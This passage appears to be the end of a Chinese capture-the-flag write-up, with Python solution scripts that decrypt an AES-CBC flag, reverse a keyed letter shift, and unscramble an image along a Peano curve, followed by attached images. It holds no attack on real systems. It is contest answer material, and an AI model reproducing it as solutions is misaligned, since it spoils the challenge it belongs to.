encrypted_flag_hex = '3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b'
encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)

# 提取IV和密文
iv = encrypted_flag_bytes[:AES.block_size]
ciphertext = encrypted_flag_bytes[AES.block_size:]

# 创建AES解密对象
cipher = AES.new(key, AES.MODE_CBC, iv)
# 解密
decrypted_data = cipher.decrypt(ciphertext)
# 去除填充
plaintext = unpad(decrypted_data, AES.block_size)

# 对替换加密的逆过程（victory_encrypt的逆）
victory_key = "WANGDINGCUP"
key_length = len(victory_key)
decrypted_text = ""
for i, char in enumerate(plaintext.decode().upper()):
    if char.isalpha():
        shift = ord(victory_key[i % key_length]) - ord('A')
        decrypted_char = chr((ord(char) - ord('A') - shift + 26) % 26 + ord('A'))
        decrypted_text += decrypted_char
    else:
        decrypted_text += char

print(decrypted_text)
```



```
from PIL import Image
from tqdm import tqdm

def peano(n):
    if n == 0:
        return [[0,0]]
    else:
        in_lst = peano(n - 1)
        lst = in_lst.copy()
        px,py = lst[-1]
        lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + 1 + i[0], py - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst)
        px,py = lst[-1]
        lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst)
        return lst

order = peano(6)

img = Image.open(r"./1.png")

width, height = img.size

block_width = width # // 3
block_height = height # // 3

new_image = Image.new("RGB", (width, height))

for i, (x, y) in tqdm(enumerate(order)):
    # 根据列表顺序获取新的坐标
    new_x, new_y = i % width, i // width
    # 获取原图像素
    pixel = img.getpixel((x, height - 1 - y))
    # 在新图像中放置像素
    new_image.putpixel((new_x, new_y), pixel)

new_image.save("rearranged_image.jpg")
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/10-1730335561.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/7-1730335562.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1730335563.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1730335564.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1730335565.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1730335566.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/5-1730335566.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1730335567.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/2-1730335567.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1730335568.png)